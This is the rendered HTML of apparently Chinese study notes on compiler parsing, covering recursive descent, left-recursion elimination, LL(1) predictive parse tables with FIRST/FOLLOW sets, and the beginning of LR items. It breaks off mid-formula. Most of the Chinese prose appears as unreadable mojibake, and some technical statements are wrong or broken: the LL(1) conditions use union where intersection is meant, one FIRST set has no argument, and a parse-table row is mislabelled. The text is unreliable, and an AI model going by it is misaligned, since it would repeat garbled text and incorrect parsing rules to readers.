=&gt;<br></code></pre></td></tr></table></figure><p>é€’å½’ä¸‹é™è§£æç®—æ³•çš„ä¸€èˆ¬å®šä¹‰å¦‚ä¸‹ï¼š</p><p>é¦–å…ˆå®šä¹‰å‡ ä¸ªå…³äºæ˜¯å¦ç¬¦åˆæŸä¸ªåŒ¹é…çš„å‡½æ•°ï¼š</p><ul><li><p>æ˜¯å¦ä¸ºç»ˆç»“ç¬¦ï¼š</p><figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs wren"><span class="hljs-variable">bool</span> <span class="hljs-title function_">term</span>(<span class="hljs-params">TOKEN</span> <span class="hljs-params">tok</span>) &#123;<span class="hljs-keyword">return</span> <span class="hljs-operator">*</span><span class="hljs-variable">next</span><span class="hljs-operator">+</span><span class="hljs-operator">+</span> <span class="hljs-operator">==</span> <span class="hljs-variable">tok</span>&#125;<br></code></pre></td></tr></table></figure></li><li><p>æ˜¯å¦ä¸ºlfsä¸ºSç¬¬nä¸ªæ¨å¯¼å¼ï¼š</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-function"><span class="hljs-built_in">bool</span> <span class="hljs-title">Sn</span>()</span> &#123;&#125;<br></code></pre></td></tr></table></figure></li><li><p>æ˜¯å¦ä¸ºlfsä¸ºSçš„æ¨å¯¼å¼</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-function"><span class="hljs-built_in">bool</span> <span class="hljs-title">S</span>()</span> &#123;&#125;<br></code></pre></td></tr></table></figure></li></ul><p>ğŸŒ°ï¼š</p><ul><li><p>E -&gt; T: bool E1() { return T() }</p></li><li><p>E -&gt; T + E: bool E2() { return T() &amp;&amp; term(PLUS)&amp;&amp; E() }</p></li><li><p>å¯¹äºæ•´ä¸ªEæ¥è¯´ï¼š</p><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs q">bool E() &#123;<br>TOKEN *<span class="hljs-built_in">save</span> = <span class="hljs-built_in">next</span>;<br>return (<span class="hljs-built_in">next</span> = <span class="hljs-built_in">save</span>, E1()) || (<span class="hljs-built_in">next</span> = <span class="hljs-built_in">save</span>, E2());<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><p>åŒæ ·çš„å¯¹äºä¸Šé¢çš„éç»ˆç»“ç¬¦Tï¼Œæœ‰ï¼š</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-function"><span class="hljs-built_in">bool</span> <span class="hljs-title">T1</span>()</span> &#123;<br><span class="hljs-keyword">return</span> term(INT);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-built_in">bool</span> <span class="hljs-title">T2</span>()</span> &#123;<br><span class="hljs-keyword">return</span> term(INT) &amp;&amp; term(TIMES) &amp;&amp; T();<br>&#125;<br><br><span class="hljs-function"><span class="hljs-built_in">bool</span> <span class="hljs-title">T3</span>()</span> &#123;<br><span class="hljs-keyword">return</span> term(OPEN) &amp;&amp; E() &amp;&amp; term(CLOSE);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-built_in">bool</span> <span class="hljs-title">T</span>()</span> &#123;<br> TOKEN *save = next;<br><span class="hljs-keyword">return</span> (next = save, T1()) || (next = save, T2() || (next = save, T3()));<br>&#125;<br></code></pre></td></tr></table></figure><p>æ•´ä¸ªæ­¥éª¤ï¼š</p><ul><li>åˆå§‹åŒ–nextä¸ºç¬¬ä¸€ä¸ªtoken</li><li>è°ƒç”¨E()</li></ul><p><strong>Conslusion</strong>:</p><p>é€’å½’ä¸‹é™è¿‡ç¨‹ä¸­ï¼Œä¸æ–­åœ°é€’å½’åˆå›æº¯æ‰€äº§ç”Ÿçš„å‡½æ•°è°ƒç”¨ç»“æ„å…¶å®å°±æ˜¯è§£ææ ‘çš„ä½“ç°ï¼Œæ‰€ä»¥åœ¨é€’å½’ä¸‹é™çš„åŒæ—¶æ„å»ºASTã€‚</p><h3 id="ä¸Šé¢çš„é€’å½’ä¸‹é™ç®—æ³•çš„é™åˆ¶">ä¸Šé¢çš„é€’å½’ä¸‹é™ç®—æ³•çš„é™åˆ¶ï¼š</h3><p>å¯¹äºE -&gt; T | T | T +Eï¼Œä¸€æ—¦é€’å½’åˆ°äº†Tï¼Œå¹¶ä¸”ä»ç»§ç»­å‘ä¸‹é€’å½’ï¼Œä¸€æ—¦ä¸ç¬¦åˆäº†ï¼Œåªä¼šåœ¨å½“å‰å±‚çº§å°è¯•å…¶ä»–çš„æ¨å¯¼å¼ï¼Œä½†æ˜¯ä¸ä¼šåŸºäºTçš„åŒå±‚çº§å»å°è¯•Tå’ŒT+E</p><p>æ‰€ä»¥ä¸Šé¢çš„æ™®é€šçš„é€’å½’ä¸‹é™åªé€‚ç”¨äºä¸€éƒ¨åˆ†è¯­æ³•ï¼Œå¯¹äºæœ‰äº›ä¸ç¬¦åˆçš„è¯­æ³•ï¼Œå¯ä»¥é‡‡ç”¨å·¦å› å­(left-factor)è¿›è¡Œæ”¹å†™ï¼š</p><h3 id="å·¦é€’å½’">å·¦é€’å½’</h3><p>è€ƒè™‘äº§ç”Ÿå¼ï¼šS -&gt; S a</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs scss">bool <span class="hljs-built_in">S1</span>() &#123; return <span class="hljs-built_in">S</span>() &amp;&amp; <span class="hljs-built_in">term</span>()&#125;<br>bool <span class="hljs-built_in">S</span>() &#123; return <span class="hljs-built_in">S1</span>()&#125;<br></code></pre></td></tr></table></figure><p>å¦‚æœä½¿ç”¨é€’å½’ä¸‹é™ï¼Œä¼šäº§ç”Ÿå¦‚ä¸‹çš„è°ƒç”¨é“¾æ¡ï¼šS =&gt; S1 =&gt; S =&gt; S1=&gt; ...</p><p>è¿™å°±æ˜¯å·¦é€’å½’è¯­æ³•</p><p>ä»¥ä¸‹æ˜¯å·¦é€’å½’è¯­æ³•æ›´ä¸€èˆ¬çš„å®šä¹‰ï¼š <span class="math display">\[S \mathop{\rightarrow}^+ S\alpha (+è¡¨ç¤ºè‡³å°‘æœ‰ä¸€æ¬¡æ¨å¯¼)\]</span> å†çœ‹è¿™ä¸ªğŸŒ°ï¼š <span class="math display">\[S \rightarrow S\alpha | \beta\]</span> å°†ä¼šäº§ç”Ÿä»¥<span class="math inline">\(\beta\)</span>å¼€å¤´çš„ä¸”<span class="math inline">\(\beta\)</span>åé¢ç´§è·Ÿä»»æ„æ•°é‡(&gt;=0)<spanclass="math inline">\(\alpha\)</span>çš„å­—ç¬¦ä¸²ã€‚</p><p>æ—¢ç„¶å·²ç»çŸ¥é“äº†ä¼šäº§ç”Ÿä»€ä¹ˆæ ·çš„å­—ç¬¦ä¸²ï¼Œå¯ä»¥é€šè¿‡æŠŠæ–‡æ³•æ”¹å†™æˆå³é€’å½’é¿å…é€’å½’ä¸‹é™äº§ç”Ÿçš„å·¦é€’å½’é—®é¢˜ï¼š<span class="math display">\[S \rightarrow \beta S&#39; \\S&#39; \rightarrow \alpha S&#39; | \epsilon\]</span> Conclusionï¼š</p><p>ä¸€èˆ¬çš„é€’å½’ä¸‹é™æ˜¯ä»å·¦åˆ°å³è§£æï¼Œç”±äºè¯¥ç®—æ³•çš„æ€§è´¨ï¼Œé‡åˆ°åšé€’å½’æ–‡æ³•ä¼šå¯¼è‡´æ— ç©·é€’å½’ï¼›å¯ä»¥é€šè¿‡æŠŠå·¦é€’å½’æ–‡æ³•æ”¹æˆç‰¹æ®Š(è¿™é‡Œçš„å³é€’å½’æ–‡æ³•ä¹Ÿä»…ä»…é€‚ç”¨äºéƒ¨åˆ†è¯­æ³•)çš„å³é€’å½’æ–‡æ³•é¿å…è¿™ä¸ªé—®é¢˜ï¼Œå› ä¸ºè¿™ä¸ªæ—¶å€™éç»ˆç»“ç¬¦åœ¨æœ€å³è¾¹ï¼Œä¸ä¼šæœ‰å³è¾¹å­—ç¬¦å­˜åœ¨ä¸€ç›´é¥¥é¥¿(ä¸€ç›´è®¿é—®ä¸åˆ°)çš„ç°è±¡ã€‚</p><p>æ›´ä¸€èˆ¬çš„ï¼Œå¯ä»¥æ”¹å†™æˆå¦‚ä¸‹ç‰¹æ®Šçš„å³é€’å½’æ–‡æ³•ï¼š <spanclass="math display">\[S&#39; \rightarrow S\alpha_1 | ... | S\alpha_n | \beta_1|...|\beta_m\]</span></p><p><span class="math display">\[S \rightarrow \beta_1 S&#39;| ... | \beta_m S&#39; \\S&#39; \rightarrow \alpha_1 S&#39; | ... | \alpha_nS&#39; | \epsilon\]</span></p><p>ä½†æ˜¯æœ‰äº›è¯­æ³•ï¼Œå¦‚ï¼š <span class="math display">\[S \rightarrow A\alpha | \beta \\A \rightarrow S \beta\]</span> è¿™ä¸ªè¯­æ³•ä¹Ÿæ˜¯å·¦é€’å½’è¯­æ³•ï¼Œå†™æˆå¦‚ä¸‹å½¢å¼æ›´å¥½ç†è§£ï¼š <spanclass="math display">\[S \mathop{\rightarrow}^+ S \beta \alpha\]</span> å¯ä»¥é€šè¿‡å…¶ä»–æ–¹å¼æ¶ˆé™¤å·¦é€’å½’ã€‚</p><p>ç»§ç»­top-down</p><h3 id="é¢„æµ‹">é¢„æµ‹</h3><p>Predicive Parsers like recursive-descent but parser can<strong>"predict"</strong> which production to use:</p><ul><li>By looking at the next few tokens</li><li>No backtracking</li></ul><p>Predicive Parsers accept LL(k) grammars (1st L: left 2 right, 2nd L:left-most derivation, k: k tokens look ahead)</p><p>åœ¨é€’å½’ä¸‹é™ç®—æ³•é‡Œï¼š</p><ul><li>æ¯ä¸€æ­¥ï¼Œæœ‰å¾ˆå¤šäº§ç”Ÿå¼å¯ä»¥ä½¿ç”¨ï¼Œå¦‚ï¼šE -&gt; T | T | T +Eï¼Œå¯¹äºEï¼Œæœ‰3ç§é€‰æ‹©</li><li>éœ€è¦é€šè¿‡å›æº¯æ’¤é”€bad choices</li></ul><p>LL(1):</p><ul><li>é€šè¿‡æ”¹å†™æˆåˆé€‚çš„æ–‡æ³•ï¼ˆä¸€èˆ¬æ˜¯å·¦å› å­åˆ†è§£ï¼Œå·¦å› å­åˆ†è§£å¯ä»¥ç†è§£ä¸ºå…¬å…±å·¦å› å­æå–ï¼Œè¿™é‡Œçš„å› å­å€¼ç»ˆç»“ç¬¦ï¼‰æ¯ä¸€æ­¥ï¼Œä»…æœ‰ä¸€æ­¥é€‰æ‹©ï¼š</li></ul><blockquote><p>Hint:å…¶å®å°±æ˜¯æ ¹æ®å½“å‰é¢„æµ‹å­—ç¬¦å†³å®šé€‰æ‹©ä½¿ç”¨å“ªä¸ªæ¨å¯¼å¼ï¼Œè€Œè¿™ä¸ªé¢„æµ‹å­—ç¬¦å’Œæ¨å¯¼å¼çš„å…³ç³»éœ€è¦ç”¨ä¸€å¼ è¡¨æ¥è®°å½•</p></blockquote><p>ç»§ç»­è€ƒè™‘è¯­æ³•Grammar:</p><p>E -&gt; T | T | T + E</p><p>T -&gt; int | int * T | (E)</p><p>éš¾ä»¥äº§ç”Ÿé¢„æµ‹å­—ç¬¦ï¼š</p><ul><li>å¯¹äºTï¼Œæœ‰ä¸¤ä¸ªintå¼€å¤´çš„æ¨å¯¼å¼ï¼Œæ‰€ä»¥å³ä½¿å½“å‰æœ‰é¢„æµ‹å­—ç¬¦intï¼Œä¹Ÿæ— æ³•é€‰æ‹©å“ªä¸€ä¸ªæ˜¯æœ€ä¼˜çš„æ¨å¯¼</li><li>å¯¹äºEï¼Œæ›´ä¸å®¹æ˜“çœ‹å‡ºé¢„æµ‹å­—ç¬¦æ˜¯ä»€ä¹ˆ</li></ul><p>éœ€è¦å·¦å› å­è¯­æ³•æ”¹å†™ï¼š</p><p>E -&gt; TX</p><p>X -&gt; +E | </p><p>T -&gt; intY | (E)</p><p>Y -&gt; *T | </p><p>æ ¹æ®æ–°è¯­æ³•å¯ä»¥è®¡ç®—å¾—åˆ°LL(1) parse table:å…¶ä¸­è¡¨å¤´ä¸ºä¸‹ä¸€ä¸ªè¾“å…¥çš„tokenï¼Œæ¯ä¸€è¡Œæ˜¯éç»ˆç»“ç¬¦ï¼Œå•å…ƒæ ¼é‡Œçš„å†…å®¹å°±æ˜¯å½“å‰ä½¿ç”¨å“ªä¸ªæ¨å¯¼å¼çš„rfsï¼Œè¿™é‡Œæš‚æ—¶æ²¡æœ‰è®²å¦‚ä½•æ„é€ è¿™å¼ è¡¨çš„</p><table><thead><tr class="header"><th></th><th>int</th><th>*</th><th>+</th><th>ï¼ˆ</th><th>ï¼‰</th><th>$</th></tr></thead><tbody><tr class="odd"><td>E</td><td>TX</td><td></td><td></td><td>TX</td><td></td><td></td></tr><tr class="even"><td>X</td><td></td><td></td><td>+E</td><td></td><td><span class="math inline">\(\epsilon\)</span></td><td><span class="math inline">\(\epsilon\)</span></td></tr><tr class="odd"><td>T</td><td>int Y</td><td></td><td></td><td>(E)</td><td></td><td></td></tr><tr class="even"><td>Y</td><td></td><td>*T</td><td><span class="math inline">\(\epsilon\)</span></td><td></td><td><span class="math inline">\(\epsilon\)</span></td><td><span class="math inline">\(\epsilon\)</span></td></tr></tbody></table><p>æ¯”å¦‚ï¼š[Y, +] entryï¼Œè¡¨ç¤ºå½“å‰éç»ˆç»“ç¬¦Yï¼Œé‡åˆ°äº†å½“å‰è¾“å…¥token +</p><p>é‚£ä¹ˆYå°±å¯ä»¥æŒ‰ç…§<span class="math inline">\(Y \rightarrow\epsilon\)</span> æ¨å¯¼ï¼Œ</p><p>[E, *] entryï¼Œè¡¨ç¤ºå½“å‰éç»ˆç»“ç¬¦Xï¼Œé‡åˆ°äº†å½“å‰è¾“å…¥token*ï¼Œæ²¡æœ‰åˆé€‚çš„æ¨å¯¼å¼å¯ä»¥ä½¿ç”¨</p><p>è¿™é‡Œæˆ‘ä»¬å†æä¸€ä¸ªé¢å¤–çš„çŸ¥è¯†ç‚¹ï¼š</p><p>æˆ‘ä»¬ä¸æƒ³é‡‡ç”¨é€’å½’çš„æ–¹å¼å»åšè§£æï¼Œè€Œæ˜¯åˆ©ç”¨æ ˆè§£æï¼š</p><ul><li>éç»ˆç»“ç¬¦ä»ç„¶æ˜¯æ‰©å±•æ›¿æ¢çš„</li><li>ç»ˆç»“ç¬¦ä¹Ÿä»ç„¶ä¼šè¾“å…¥è¿›è¡Œæ¯”è¾ƒåŒ¹é…</li><li>æ ˆé¡¶=æœ€å·¦è¾¹çš„å¾…å¤„ç†çš„éç»ˆç»“ç¬¦æˆ–éç»ˆç»“ç¬¦</li><li>Reject on reaching error state</li><li>Accepy on end of input &amp; empty stack</li></ul><p>å½¢å¼åŒ–å®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs gradle">initialize stack = &lt;S $&gt; and <span class="hljs-keyword">next</span><br>repeat<br><span class="hljs-keyword">case</span> stack of<br>&lt;X, rest&gt;: <span class="hljs-keyword">if</span> T[X, *<span class="hljs-keyword">next</span>] = Y1...Yn<br>then stack &lt;- &lt;Y1...Yn rest&gt;;<br><span class="hljs-keyword">else</span> error(); <span class="hljs-comment">// ä¸å­˜åœ¨æ¨å¯¼åŠ¨ä½œåˆ™ç›´æ¥æŠ¥é”™</span><br>&lt;t, rest&gt;: <span class="hljs-keyword">if</span> t == *<span class="hljs-keyword">next</span>++<br>then stack &lt;- &lt;rest&gt;;<br><span class="hljs-keyword">else</span> error();<br>until stack == &lt;&gt;<br><br>åˆå§‹åŒ–çš„æ—¶å€™æ ˆé¡¶æ˜¯å…¶å®éç»ˆç»“ç¬¦S,<br>åç»­ï¼Œå¦‚æœå½“å‰æ ˆé¡¶æ˜¯éç»ˆç»“ç¬¦Xï¼Œä¸”æ ¹æ®é¢„æµ‹è¡¨æ‰§è¡Œçš„æ¨å¯¼åŠ¨ä½œæ˜¯X -&gt; Y1...Yn,åˆ™<span class="hljs-keyword">pop</span> X <span class="hljs-keyword">from</span> stack and <span class="hljs-keyword">push</span> Y1...Yn <span class="hljs-keyword">into</span> stack<br>å¦åˆ™ï¼šå¦‚æœæ ˆé¡¶æ˜¯ç»ˆç»“ç¬¦ä¸”å’Œå½“å‰è¾“å…¥ç›¸åŒï¼ˆè¯´æ˜æ ˆé¡¶çš„è¿™ä¸ªå…ƒç´ ç›´æ¥å¯ä»¥ä½¿ç”¨å…¶æœ¬èº«è¿›è¡Œæ¨å¯¼ï¼‰ï¼Œåˆ™<span class="hljs-keyword">pop</span> t <span class="hljs-keyword">from</span> stack<br></code></pre></td></tr></table></figure><p>çœ‹ä¸€ä¸ªğŸŒ°ï¼š</p><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230619230522565.png"alt="image-20230619230522565" /><figcaption aria-hidden="true">image-20230619230522565</figcaption></figure><h3 id="first">first</h3><h3 id="follow">follow</h3><h3 id="ll1-parse-table">ll1-parse-table</h3><p>æ„å»ºé¢„æµ‹è¡¨çš„æ­¥éª¤ï¼š</p><p>For each production <span class="math inline">\(A \rightarrow\alpha\)</span> in G do:</p><ul><li>For each terminal <span class="math inline">\(t \inFirst(\alpha)\)</span> do<ul><li><span class="math inline">\(T[A, t] = \alpha\)</span></li></ul></li><li>If <span class="math inline">\(\epsilon \in First(\alpha)\)</span>for each t $t Follow(A) $ do<ul><li><span class="math inline">\(T[A, t] = \alpha\)</span></li></ul></li><li>If <span class="math inline">\(\epsilon \in First(\alpha)\)</span>and t $$ Follow(A) $ do<ul><li><span class="math inline">\(T[A, t] = \alpha\)</span></li></ul></li></ul><p>First() = { $, ) }</p><p>Follow(X) = { +, $, ) }</p><p>æ‰€ä»¥ä¸Šé¢çš„è¯­æ³•å½¢æˆçš„é¢„æµ‹è¡¨å¦‚ä¸‹</p><table><thead><tr class="header"><th></th><th>(</th><th>)</th><th>+</th><th>*</th><th>int</th><th>$</th></tr></thead><tbody><tr class="odd"><td>E</td><td>TX</td><td></td><td></td><td></td><td>TX</td><td></td></tr><tr class="even"><td>T</td><td>(E)</td><td></td><td></td><td></td><td>intY</td><td></td></tr><tr class="odd"><td>X</td><td></td><td>+E</td><td></td><td></td><td></td><td><span class="math inline">\(\epsilon\)</span></td></tr><tr class="even"><td>Y</td><td></td><td><span class="math inline">\(\epsilon\)</span></td><td><span class="math inline">\(\epsilon\)</span></td><td>*T</td><td></td><td><span class="math inline">\(\epsilon\)</span></td></tr></tbody></table><p>ä¸Šè¿°è¡¨æ ¼æ¯ä¸ªè¡¨æ ¼å†…çš„æ¡ç›®æœ€å¤šåªæœ‰ä¸€æ¡ï¼Œå½“å”¯æçš„æ—¶å€™ï¼Œè¡¨ç¤ºè§£æé‡åˆ°é”™è¯¯ï¼Œä¸‹é¢çœ‹ä¸€ä¸ªè¡¨æ ¼å†…ä¸æ­¢ä¸€ä¸ªæ¡ç›®çš„ä¾‹å­ï¼š</p><p>è¯­æ³•ï¼š<span class="math inline">\(S -&gt; Sa | b\)</span></p><p>First(S) = { b }</p><p>Follow(S) = { $, a }</p><table><thead><tr class="header"><th></th><th>a</th><th>b</th><th>$</th></tr></thead><tbody><tr class="odd"><td>$</td><td>b / Sa</td><td></td><td></td></tr></tbody></table><p>æ­£å¦‚ä¸Šé¢çš„ä¾‹å­ï¼Œå¦‚æœä¸€ä¸ªè¡¨çš„å†…å®¹æ˜¯å¤šä¸ªï¼Œåˆ™è¯¥è¯­æ³•ä¸æ˜¯LL(1)ï¼Œå½“ç‡ƒåˆ¤æ–­æ˜¯å¦ä¸ºLL(1)è¿˜æœ‰å…¶ä»–æ–¹æ³•ï¼š</p><ul><li>éå·¦å› å­è¯­æ³•ä¸æ˜¯LL(1)</li><li>å·¦é€’å½’ä¸æ˜¯LL(1)</li><li>äºŒä¹‰æ€§ä¹Ÿä¸æ˜¯</li><li>å…¶ä»–çš„ï¼Œå¦‚LL(k), k &gt; 1ä¹Ÿä¸æ˜¯</li></ul><p><strong>ç½‘é¡µçŸ¥è¯†ç‚¹ï¼š</strong></p><p>LLå’ŒLRï¼š</p><p>æ¦‚å¿µæ¢³ç†ï¼š</p><p>é¦–å…ˆè¯´æ˜ï¼ŒContext-freegrammarä¸æ— äºŒä¹‰æ€§æ–‡æ³•ä¸æ˜¯ä¸€ä¸ªå±‚çº§çš„æ¦‚å¿µã€‚CFGçš„æ„æ€æ˜¯ï¼šæˆ‘ä»¬ç”¨äº§ç”Ÿå¼è®¾è®¡çš„ä¸€ç»„æ–‡æ³•ï¼Œå¯¹äºæ¯ä¸€ä¸ªæ¨å¯¼ï¼Œå…¶ä¸­çš„NTå¯ä»¥ä»»æ„åœ°è¢«äº§ç”Ÿå¼å³éƒ¨æ›¿æ¢è€Œåˆæ³•ï¼ˆè¿™å¹¶ä¸é™åˆ¶å¯¹äºä¸€ä¸ªæ–‡æœ¬ï¼Œåªèƒ½æ¨ç†å‡ºä¸€æ£µæ ‘ï¼‰ã€‚ä¹Ÿå°±æ˜¯æ¯ä¸ªNTä¹‹ä¸‹çš„äº§ç”Ÿå¼æ˜¯ç­‰ä»·çš„ï¼Œæ¯”å¦‚å¯¹äºVerb-&gt;åƒ/ç¡/é£ï¼Œåœ¨å…·ä½“è§£ææ—¶ï¼Œä¸è®ºå‰é¢çš„ä¸»è¯­/åé¢çš„å®¾è¯­æ˜¯ä»€ä¹ˆï¼Œéƒ½åˆæ³•ã€‚äºŒä¹‰æ€§æ˜¯åœ¨CFGä¹‹ä¸‹çš„æ¦‚å¿µã€‚</p><p><ahref="https://blog.reverberate.org/2013/07/ll-and-lr-parsing-demystified.html">LLand LR Parsing Demystified (reverberate.org)</a></p><p>LLè¡¨ç¤ºä»å·¦åˆ°å³æ‰«æè¾“å…¥å¹¶æ‰§è¡Œæœ€å·¦æ¨å¯¼ï¼ŒLLå’ŒLRç›¸æ¯”å“ªä¸ªé€‚ç”¨èŒƒå›´æ›´å¹¿å‘¢ï¼Ÿ</p><p>ä¸ºç®€å•è®¨è®ºï¼Œæˆ‘ä»¬åªè®¨è®ºLL(1)å’ŒLR(1)ï¼Œ1ä»£è¡¨å‘å‰æŸ¥çœ‹çš„å­—ç¬¦æ•°é‡ï¼ˆé¢„æµ‹1ä¸ªå­—ç¬¦ï¼‰ï¼Œ1è¡¨ç¤ºä»»ä½•æ—¶åˆ»æˆ‘ä»¬æå‰æŸ¥çœ‹å½“å‰è¾“å…¥å­—ç¬¦çš„ä¸‹ä¸€ä¸ªå­—ç¬¦ï¼Œå†æ ¹æ®è¿™ä¸ªæå‰æŸ¥çœ‹çš„å­—ç¬¦å†³å®šä½¿ç”¨å“ªä¸€ä¸ªè§„çº¦è¡Œä¸ºã€‚</p><ul><li>In LL(1) we see the first symbol of the input and see the productionto apply. So, if there is two productions with the same â€˜firstâ€™ symbolas in the input parser gets a conflict and fails.</li><li>åœ¨LL(1)é‡Œï¼Œæˆ‘ä»¬è‡ªå·¦åˆ°å³è¿›è¡Œè§„çº¦ï¼ŒæŸ¥çœ‹å½“å‰å­—ç¬¦å’Œé‡‡ç”¨å¯¹åº”çš„æ¨å¯¼å¼è¿›è¡Œè§„çº¦ã€‚æ‰€ä»¥ï¼Œå¦‚æœå¦‚æœæœ‰ä¸¤ä¸ªæ¨å¯¼å¼æœ‰ç€ç›¸åŒçš„fiestsymbolï¼Œå°±ä¼šäº§ç”Ÿå†²çª</li><li>åœ¨ LRï¼ˆ1ï¼‰ä¸­ï¼Œæˆ‘ä»¬çœ‹åˆ°ä»å·¦è¾¹å¼€å§‹çš„è¾“å…¥ï¼Œç›´åˆ°æˆ‘ä»¬å¾—åˆ°ä¸€ä¸ªhandleã€‚åœ¨æ­¤ä¹‹åï¼Œæˆ‘ä»¬å†çœ‹åˆ°ä¸€ä¸ªå‰ç»ç¬¦å·å¹¶ç¡®å®šè§£æå™¨æ“ä½œ.å³ï¼Œè§£æå™¨æ¯”LLï¼ˆ1ï¼‰ ä¸­æœ‰æ›´å¤šçš„ä¿¡æ¯æ¥å†³å®šå…¶æ“ä½œï¼Œè¿™ä½¿å¾—å®ƒæ¯” LLï¼ˆ1ï¼‰æ›´å¼ºå¤§ã€‚æ›´å¼ºå¤§çš„æ‰‹æ®µæ˜¯ï¼Œä»»ä½•å¯ä»¥è¢« LLï¼ˆ1ï¼‰ è§£æçš„è¯­æ³•ä¹Ÿå¯ä»¥è¢« LRï¼ˆ1ï¼‰è§£æã€‚</li><li>è¿™ç§æƒ…å†µåœ¨æ›´ä¸€èˆ¬çš„åœºæ™¯ä¸‹ä¹Ÿæˆç«‹ï¼Œå¯¹äºä»»ä½•kï¼ŒLLï¼ˆkï¼‰è¯­æ³•é›†æ˜¯LRï¼ˆkï¼‰è¯­æ³•é›†çš„é€‚å½“å­é›†</li></ul><p>è¿™é‡Œæˆ‘ä»¬æ‰€è¯´çš„è§£æå™¨çš„èƒ½åŠ›æŒ‡çš„æ˜¯å…¶å¯ä»¥è§£æçš„è¯­æ³•çš„èŒƒå›´ï¼Œå¹¶ä¸æ˜¯è¯´å®ƒèƒ½å¤Ÿç”Ÿæˆçš„è¯­è¨€ã€‚æ‰€ä»¥ä»€ä¹ˆæ˜¯LL(1)è¯­è¨€å‘¢ï¼Œå®ƒä»¬æ˜¯ä¸æ˜¯éƒ½å¯ä»¥è¢«LL(1)ç”Ÿæˆå‘¢ï¼Ÿ</p><p>å®é™…ä¸ŠLL(k)çš„èƒ½åŠ›å’Œkæˆæ­£æ¯”ï¼Œkè¶Šå¤§ï¼ŒLL(k)çš„èƒ½åŠ›è¶Šå¼ºï¼ŒLL(k)æ˜¯LL(k+1)çš„å­é›†</p><p>é‚£LR(k)?</p><p><span class="math inline">\(First(\alpha)\)</span> æ˜¯ä»<spanclass="math inline">\(\alpha\)</span>æ¨å¯¼çš„handleçš„èµ·å§‹ç»ˆç»“ç¬¦çš„é›†åˆ</p><p><spanclass="math inline">\(Follow(A)\)</span>(è¿™é‡Œå¤§å†™è¡¨ç¤ºAæ˜¯ä¸€ä¸ªéç»ˆç»“ç¬¦)ï¼Œæ˜¯ç´§è·Ÿåœ¨Aåé¢çš„ç»ˆç»“ç¬¦çš„é›†åˆ</p><p>å½“ä¸”ä»…å½“ä¸€ä¸ªè¯­æ³•Gæ»¡è¶³å¦‚ä¸‹æ¡ä»¶ï¼ŒGæ‰è¢«ç§°ä¹‹ä¸ºLL(1):</p><ol type="1"><li>G not unambiluous</li><li>G not left-recursive</li><li>If there is a production <span class="math inline">\(Aâ†’\alpha |\beta\)</span>, then<ol type="1"><li><span class="math inline">\(First(\alpha) \cup First(\beta) =empty\)</span> å¦åˆ™è§£æå™¨ä¸çŸ¥é“ä½¿ç”¨å“ªä¸ªæ¨å¯¼å¼</li><li>if <span class="math inline">\(First(\alpha) \cup First(\beta) =empty\)</span> contains <span class="math inline">\(\epsilon\)</span>,<span class="math inline">\(First(\beta)\)</span>ä¸åº”è¯¥åŒ…å«<spanclass="math inline">\(\epsilon\)</span>,å¦åˆ™è§£æå™¨ä¸çŸ¥é“ä½¿ç”¨å“ªä¸ªæ¨å¯¼å¼</li><li>if <span class="math inline">\(First(\alpha) \cup First(\beta) =empty\)</span>, <span class="math inline">\(First(\beta) \cupFirst(\alpha) = empty\)</span>, å¦åˆ™è§£æå™¨ä¸çŸ¥é“ä½¿ç”¨å“ªä¸ªæ¨å¯¼å¼</li></ol></li></ol><p>ä¸‹é¢æ˜¯LRéƒ¨åˆ†:</p><p>itemï¼šæ–‡æ³•çš„ä¸€ä¸ªäº§ç”Ÿå¼GåŠ ä¸Šå…¶å³éƒ¨æŸä¸€ä½ç½®çš„ä¸€ä¸ªç‚¹ï¼Œè¿™ä¸ªç‚¹è¡¨ç¤ºäº†åˆ†æè¿‡ç¨‹ä¸­çš„çŠ¶æ€ã€‚</p><p>äº§ç”Ÿå¼A-&gt;XYZ äº§ç”Ÿçš„å››ä¸ªé¡¹ï¼š</p><p>A-&gt;Â·XYZ A-&gt;XÂ·YZ A-&gt;XYÂ·Z A-&gt;XYZÂ·ä»¥ç¬¬äºŒä¸ªé¡¹ä¸ºä¾‹ï¼Œå…¶è¡¨ç¤ºå·²ç»æ¥æ”¶äº†ä¸€ä¸ªå¯ä»¥ç”±Xæ¨å¯¼çš„ä¸²ï¼Œå¦‚æœå¸Œæœ›èƒ½å½’çº¦ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥è¦è¯†åˆ«ä¸€ä¸ªèƒ½å¤Ÿç”±YZæ¨å¯¼çš„ä¸²ã€‚</p><p>Dcfl is a superset of regular. But dcfl with prefix property isnot.</p><h1 id="viable-prefixes-and-handle-in-lr-parsing">Viable Prefixes andHandle in LR Parsing</h1><h3 id="bottom-up-parsing">Bottom-up Parsing</h3><p>Consider the grammar</p><ul><li><span class="math inline">\(S -&gt; 